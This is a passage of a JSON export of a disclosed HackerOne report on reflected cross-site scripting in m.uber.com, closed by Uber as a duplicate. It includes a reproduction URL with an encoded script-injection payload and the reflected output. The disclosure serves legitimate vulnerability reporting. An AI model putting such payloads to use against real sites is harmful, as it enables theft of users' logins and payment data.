newcomers to the field of information security.&quot;<br>\n<a title=\"https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting#Reflected_XSS_.28AKA_Non-Persistent_or_Type_II.29\" href=\"/redirect?signature=147404a937a3723468865ecd0de05e26373457a5&amp;url=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTypes_of_Cross-Site_Scripting%23Reflected_XSS_.28AKA_Non-Persistent_or_Type_II.29\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting#Reflected_XSS_.28AKA_Non-Persistent_or_Type_II.29</span><i class=\"icon-external-link\"></i></a> &quot;Server XSS occurs when untrusted user supplied data is included in an HTML response generated by the server. The source of this data could be from the request, or from a stored location. As such, you can have both Reflected Server XSS and Stored Server XSS.&quot;</p>\n\n<p>etc.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2243228, 
            "genius_execution_id": null
        }, 
        {
            "original_report_id": 276134, 
            "automated_response": false, 
            "created_at": "2017-12-23T01:15:58.774Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-23T01:15:58.774Z", 
            "actor": {
                "username": "lindsey-uber", 
                "url": "/lindsey-uber", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Hey @gregperry, we were able to verify that by hosting javascript at a domain in our CSP whitelist that you would indeed be able to execute Javascript, making this reflected XSS in m.uber.com. Unfortunately, we also found this to be a duplicate of report #276134. Either way, thanks for the reports and good luck bug hunting in the future!", 
            "markdown_message": "<p>Hey <a href=\"/gregperry\">@gregperry</a>, we were able to verify that by hosting javascript at a domain in our CSP whitelist that you would indeed be able to execute Javascript, making this reflected XSS in m.uber.com. Unfortunately, we also found this to be a duplicate of report <a href=\"/reports/276134\">#276134</a>. Either way, thanks for the reports and good luck bug hunting in the future!</p>\n", 
            "type": "Activities::BugDuplicate", 
            "id": 2243657, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-23T01:16:05.610Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-23T01:16:05.610Z", 
            "actor": {
                "url": "/uber", 
                "profile": {
                    "name": "Uber"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/314/0010251d7088db2a1b236eb594b6371af4492609_medium.png?1514905146"
                }
            }, 
            "team_handle": "uber", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::CommentsClosed", 
            "id": 2243658, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-24T20:46:17.057Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-24T20:46:17.057Z", 
            "actor": {
                "username": "fletcher", 
                "url": "/fletcher", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/090/ff77c612c467177339fdbacd37000fddabaec61b_medium.jpg?1420748005"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2245244, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-26T11:03:42.402Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-26T11:03:42.402Z", 
            "actor": {
                "username": "fletcher", 
                "url": "/fletcher", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/090/ff77c612c467177339fdbacd37000fddabaec61b_medium.jpg?1420748005"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ManuallyDisclosed", 
            "id": 2246684, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "gregoryvperry", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/gregoryvperry", 
        "profile_picture_urls": {
            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 61, 
        "name": "Cross-site Scripting (XSS) - Reflected"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2017-12-26T11:03:42.453Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/296701", 
    "created_at": "2017-12-10T18:06:43.055Z", 
    "original_report_url": "https://hackerone.com/reports/276134", 
    "vulnerability_information_html": "<h2 id=\"summary\">Summary</h2>\n\n<p>m.uber.com is susceptible to reflected XSS</p>\n\n<h2 id=\"security-impact\">Security Impact</h2>\n\n<p>A malformed URL can be used to render arbitrary SSL-protected web pages from m.uber.com</p>\n\n<h2 id=\"reproduction-steps\">Reproduction Steps</h2>\n\n<p><a title=\"https://m.uber.com/?bjbxm%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3exrii5=1\" href=\"/redirect?signature=8dfd4be0f85a428078a5b1e864456a8efd45bb07&amp;url=https%3A%2F%2Fm.uber.com%2F%3Fbjbxm%253c%252fscript%253e%253cscript%253ealert%281%29%253c%252fscript%253exrii5%3D1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://m.uber.com/?bjbxm%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3exrii5=1</span><i class=\"icon-external-link\"></i></a></p>\n\n<h2 id=\"specifics\">Specifics</h2>\n\n<p>From the rendered web page:</p>\n<pre class=\"highlight plaintext\"><code>{&quot;enabled&quot;:true,&quot;sid&quot;:&quot;bbc661585c424072&quot;,&quot;url&quot;:&quot;www.cdn-net.com&quot;,&quot;cf&quot;:1022963},&quot;queryParams&quot;:{&quot;bjbxm&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;xrii5&quot;:&quot;1&quot;}\n</code></pre>\n<p>No further efforts were made to render a more believable webpage as the vulnerability and reflected code above is sufficient to trigger Chromium Browser&#39;s XSS _Auditor protections.</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>An attacker could render arbitrary SSL-protected web pages from m.uber.com, to capture user login credentials and passwords, credit card numbers and related payment information, etc.</p>\n", 
    "severity_rating": "critical", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.uber.com", 
            "about": "", 
            "twitter_handle": "", 
            "name": "Uber"
        }, 
        "handle": "uber", 
        "url": "https://hackerone.com/uber", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/314/826c90cba1555458df787ae914793cd5070e18df_small.png?1514905146", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/314/0010251d7088db2a1b236eb594b6371af4492609_medium.png?1514905146"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 314, 
        "default_currency": "usd"
    }, 
    "is_published": false
}